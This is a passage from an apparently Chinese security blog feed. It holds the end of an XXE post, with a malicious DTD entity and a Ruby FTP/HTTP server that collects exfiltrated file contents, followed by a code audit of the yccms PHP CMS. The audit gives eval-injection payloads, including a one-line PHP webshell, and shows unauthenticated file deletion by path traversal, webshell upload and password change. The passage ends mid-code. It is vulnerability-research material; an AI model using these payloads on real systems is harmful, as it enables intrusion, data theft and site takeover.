&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;#37; rrr SYSTEM \&#x27;</span>ftp:<span class="hljs-comment">//127.0.0.1:2121/%b;\&#x27;&gt;&quot;&gt;</span><br>           %c;&#x27;<br><br>Thread.start <span class="hljs-keyword">do</span><br>loop <span class="hljs-keyword">do</span><br>  Thread.start(http_server.accept) <span class="hljs-keyword">do</span> |http_client|<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;HTTP. New client connected&quot;</span><br>loop &#123;<br>req = http_client.gets()<br><span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> req.nil?<br><span class="hljs-keyword">if</span> req.start_with? <span class="hljs-string">&quot;GET&quot;</span><br>http_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;HTTP/1.1 200 OK\r\nContent-length: #&#123;payload.length&#125;\r\n\r\n#&#123;payload&#125;&quot;</span>)<br>end<br><span class="hljs-built_in">puts</span> req<br>&#125;<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;HTTP. Connection closed&quot;</span><br>  end<br>end<br><br>end<br><br>Thread.start <span class="hljs-keyword">do</span><br>loop <span class="hljs-keyword">do</span><br>  Thread.start(ftp_server.accept) <span class="hljs-keyword">do</span> |ftp_client|<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;FTP. New client connected&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;220 xxe-ftp-server&quot;</span>)<br>loop &#123;<br>req = ftp_client.gets()<br><span class="hljs-keyword">break</span> <span class="hljs-keyword">if</span> req.nil?<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&lt; &quot;</span>+req<br><span class="hljs-built_in">log</span>.write <span class="hljs-string">&quot;get req: #&#123;req.inspect&#125;\n&quot;</span><br><br><span class="hljs-keyword">if</span> req.include? <span class="hljs-string">&quot;LIST&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;drwxrwxrwx 1 owner group          1 Feb 21 04:37 test&quot;</span>)<br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;150 Opening BINARY mode data connection for /bin/ls&quot;</span>)<br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;226 Transfer complete.&quot;</span>)<br>elsif req.include? <span class="hljs-string">&quot;USER&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;331 password please - version check&quot;</span>)<br>elsif req.include? <span class="hljs-string">&quot;PORT&quot;</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;! PORT received&quot;</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&gt; 200 PORT command ok&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;200 PORT command ok&quot;</span>)<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;&gt; 230 more data please!&quot;</span><br>ftp_client.<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;230 more data please!&quot;</span>)<br>end<br>&#125;<br><span class="hljs-built_in">puts</span> <span class="hljs-string">&quot;FTP. Connection closed&quot;</span><br>  end<br>end<br>end<br><br>loop <span class="hljs-keyword">do</span><br>sleep(<span class="hljs-number">10000</span>)<br>end<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>代码审计一般只需要通过打DNS得到访问记录判断此漏洞存在即可</li><li>实际利用此漏洞(无回显)需要通过dns外带数据得到敏感信息</li><li>http传输一般只会读取文件第一行，可以通过开启恶意ftp服务读取换行文件</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms代码审计(php)</title>
    <link href="/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/"/>
    <url>/2025/07/08/yccms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(php)/</url>
    
    <content type="html"><![CDATA[<h1 id="yccms代码审计-php"><a href="#yccms代码审计-php" class="headerlink" title="yccms代码审计(php)"></a>yccms代码审计(php)</h1><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><ul><li>更改config.inc.php对应的数据库名，用户名及密码即可</li><li>运行yccms.sql文件，在数据库中导入sql数据</li><li>访问http:&#x2F;&#x2F;域名&#x2F;admin，用户名及密码都为admin，登录后台</li></ul><h3 id="配置xdebug"><a href="#配置xdebug" class="headerlink" title="配置xdebug"></a>配置xdebug</h3><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h4><ul><li><p><a href="https://segmentfault.com/a/1190000018961750">2024年更新，PhpStorm配置Xdebug最完整最详解教程，100%成功！ - 个人文章 - SegmentFault 思否</a></p></li><li><p>小迪安全php代码审计课程 day108</p></li><li><p><a href="https://mp.weixin.qq.com/s/7K8edea8imalZ8_jJp3ODw">phpstorm+phpstudy 配置xdebug (qq.com)</a></p></li></ul><h4 id="详细步骤："><a href="#详细步骤：" class="headerlink" title="详细步骤："></a>详细步骤：</h4><ul><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php-&gt;sever</p><p>新建一个服务器，名称任意，端口与网站搭建端口一致</p><p><img src="/img/yccms/yccms02.png" alt="图片"></p></li><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php-&gt;Debug(调试)</p><p>设置端口号为9100，防止端口进程冲突</p><p><img src="/img/yccms/yccms03.png" alt="图片"></p><p>调试下的DBGp按照如图设置，端口与刚刚设置的调试端口相对应</p><p><img src="/img/yccms/yccms04.png" alt="图片"></p><p>打开phpstudy，查看网站使用的php版本</p><p>在软件管理选项中找到对应的php版本，点击设置</p><p>打开xdebug调试组件，端口监听与刚刚设置的调试端口设为一致</p><p><img src="/img/yccms/yccms05.png" alt="图片"></p></li><li><p>phpstorm左上角file(菜单)-&gt;setting(设置)-&gt;php</p><p>将版本设置为与刚刚在phpstudy中查看的此网站使用的php版本</p><p><img src="/img/yccms/yccms06.png" alt="图片"></p></li><li><p>右上角添加配置中选择php网页添加配置</p><p><img src="/img/yccms/yccms07.png" alt="图片"></p></li></ul><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p><img src="/img/yccms/yccms01.png" alt="图片"></p><p>可以看出此源码是MVC结构，最核心的控制代码在controller与model文件夹内</p><p>翻看目录发现此源码使用了smarty模板，随后可以查看是否存在ssti模板注入</p><h4 id="路由关系"><a href="#路由关系" class="headerlink" title="路由关系"></a>路由关系</h4><ul><li><p>?a&#x3D;admin&amp;m&#x3D;update</p><p>key值为a传入类名，key值为m传入方法名</p></li></ul><h4 id="漏洞复现-有入口，才可利用"><a href="#漏洞复现-有入口，才可利用" class="headerlink" title="漏洞复现(有入口，才可利用)"></a>漏洞复现(有入口，才可利用)</h4><p>参考：<a href="https://www.cnblogs.com/KRookieSec/p/17142265.html">记一次完整的PHP代码审计——yccms v3.4审计 - KRookieSec - 博客园 (cnblogs.com)</a></p><p>​   <a href="https://xz.aliyun.com/news/9362">代码审计—YCCMS系统-先知社区 (aliyun.com)</a></p><p>使用seay进行自动化审计，找到可能存在漏洞的地方，逐个测试</p><p><img src="/img/yccms/yccms08.png" alt="图片"></p><h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><p>找到此方法是否有被实例化</p><p>发现run.inc.php实例化此方法，admin&#x2F;index.php包含了此文件</p><p>public&#x2F;class目录下的Factory.class.php文件，文件类名为Factory</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setModel</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$_a</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/model/&#x27;</span>.<span class="hljs-variable">$_a</span>.<span class="hljs-string">&#x27;Model.class.php&#x27;</span>)) <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Model();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>eval函数内变量可控</p><p>需要传入一个类名，并且满足(或绕过)file_exists()函数的检查</p><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();phpinfo();//../<br></code></pre></td></tr></table></figure><p>分析：</p><ol><li>调用Factory()类中方法</li><li>用;隔开以执行下一条语句</li><li>&#x2F;..&#x2F;跳至上一级绕过file_exist()函数检测</li></ol><p>顺利注入</p><p><img src="/img/yccms/yccms10.png" alt="图片"></p><p>尝试写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?a=Factory();@eval($_POST[v]);//../<br></code></pre></td></tr></table></figure><p>看一些文章是可以顺利连接的，我这里没有成功</p><h5 id="无需登录文件删除"><a href="#无需登录文件删除" class="headerlink" title="无需登录文件删除"></a>无需登录文件删除</h5><p>controller&#x2F;PicAction.class.php文件中控制删除功能的方法没有对文件名及文件路径的检测</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123; <span class="hljs-comment">// 定义一个公共方法 delall，用于删除图片</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123; <span class="hljs-comment">// 如果表单提交了（send 参数存在）</span><br>        <span class="hljs-comment">// 如果 pid 参数为空（即用户没有选择任何图片）</span><br>        <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>])) <br>            <span class="hljs-comment">// 弹出警告框提示“没有选择任何图片”，然后跳转回 pic 页面</span><br>            tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br><br>        <span class="hljs-variable">$_fileDir</span> = ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>; <span class="hljs-comment">// 图片文件所在的目录</span><br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123; <span class="hljs-comment">// 遍历所有要删除的图片文件名</span><br>            <span class="hljs-variable">$_filePath</span> = <span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>; <span class="hljs-comment">// 构造完整的文件路径</span><br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123; <span class="hljs-comment">// 尝试删除该文件，如果失败</span><br>                <span class="hljs-comment">// 弹出警告框提示“图片删除失败”，建议设置权限为 777</span><br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 删除成功后，立即重定向回 pic 页面</span><br>                <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其他文件有文件路径检测，如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;\\&#x27;</span>.<span class="hljs-variable">$_navname</span>.<span class="hljs-string">&#x27;\\&#x27;</span>);<br></code></pre></td></tr></table></figure><p>开始测试</p><p>寻找网站功能点：其他功能-&gt;图片管理</p><p>点击删除按钮后抓取数据包，得到数据包内容</p><p><img src="/img/yccms/yccms11.png" alt="图片"></p><p>send值是url编码过的，解码后为删除选中图片</p><p>pid后url编码解码后为[0]</p><p>退出admin账户的登陆后，将网站根目录下CMS系统安装声明文件重命名为CMS(一会测试时无需再对中文url编码)</p><p>更改数据包pid[0]参数的值为&#x2F;..&#x2F;CMS，发送数据包，发现成功删除文件</p><h5 id="无需登录文章删除"><a href="#无需登录文章删除" class="headerlink" title="无需登录文章删除"></a>无需登录文章删除</h5><p>controller&#x2F;ArticleAction.class.php</p><p>漏洞代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何内容!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br><span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;静态文件删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过代码可以看到基本上是没有检测的，传入id即可删除对应的文章，但是由于变量是固定的，所以只能删除文章</p><p>不能删除其他文件</p><p>开始测试：</p><p>寻找功能点：内容管理-&gt;文章列表</p><p>点击删除抓取数据包</p><p><img src="/img/yccms/yccms13.png" alt="图片"></p><p>看到是直接get传参，更改id的值就可以的</p><p>退出登录后更改id发送数据包，再次登录查看，发现顺利删除文章</p><h5 id="无需登录文件上传01"><a href="#无需登录文件上传01" class="headerlink" title="无需登录文件上传01"></a>无需登录文件上传01</h5><p>public&#x2F;class&#x2F;FileUpload.class.php</p><p>查看源代码发现只对上传图片类型和文件大小做了判断，并且进行了重命名</p><p>在网站寻找功能点：系统设置-&gt;首页内容</p><p>在编辑器自带的文件上传功能点处可以上传文件</p><p>抓取数据包，更改文件名和文件内容，顺利上传</p><p><img src="/img/yccms/yccms14.png" alt="图片"></p><p>用蚁剑成功连接</p><p><img src="/img/yccms/yccms15.png" alt="图片"></p><p>经测试，退出登陆后直接发包也可以正常上传，可以正常连接</p><h5 id="无需登录文件上传02"><a href="#无需登录文件上传02" class="headerlink" title="无需登录文件上传02"></a>无需登录文件上传02</h5><p>直接寻找功能点：系统设置-&gt;上传logo</p><p>找到对应控制代码</p><p><img src="/img/yccms/yccms16.png" alt="图片"></p><p>上传后的文件会被重命名为logo，检验文件类型的函数极容易绕过</p><p>方法同01抓取数据包后更改文件内容与文件名</p><p>可以看到顺利上传</p><p><img src="/img/yccms/yccms17.png" alt="图片"></p><p>用蚁剑测试依旧是能够连接成功</p><p><img src="/img/yccms/yccms18.png" alt="图片"></p><p>退出登录后同样可以发送数据包并且用蚁剑顺利连接</p><h5 id="任意密码修改-未鉴权"><a href="#任意密码修改-未鉴权" class="headerlink" title="任意密码修改(未鉴权)"></a>任意密码修改(未鉴权)</h5><p>controller&#x2F;AdminAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//后台初始</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/admin.tpl&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br><br>&#125;<br><span class="hljs-comment">//修改密码</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到登录到后台页面是有鉴权的，但是执行update方法时就没有鉴权了</p><p>在网站找到功能点：其他功能-&gt;修改密码</p><p>抓取数据包，在数据包中做数据的修改</p><p><img src="/img/yccms/yccms19.png" alt="图片"></p><p>网站退出登录后可以正常发送数据包</p><p>尝试新用户名和密码后发现可以正常登录</p><h5 id="rce-Action-class-php-误报"><a href="#rce-Action-class-php-误报" class="headerlink" title="rce(Action.class.php)误报"></a>rce(Action.class.php)误报</h5><p>路径：controller&#x2F;Action.class.php</p><p>调用eval函数，可能存在rce漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>查找利用点时发现每一个controller中的文件都继承了此类</p><p>构造payload(<a href="http://localhost/yccms/admin/?a=admin&m=phpinfo)%E5%8F%91%E7%8E%B0%E5%B9%B6%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE">http://localhost/yccms/admin/?a=admin&amp;m=phpinfo)发现并没有回显</a></p><p>使用动态调试后可以看到m的值初始时为phpinfo</p><p><img src="/img/yccms/yccms09.png" alt="图片"></p><p>经过run.inc.php方法中代码Factory::setAction()-&gt;run();</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 使用工厂模式调用控制器并执行对应方法</span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br></code></pre></td></tr></table></figure><p>m的值被替换为main</p><p>查看setAction方法，此方法中的可控变量是a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span 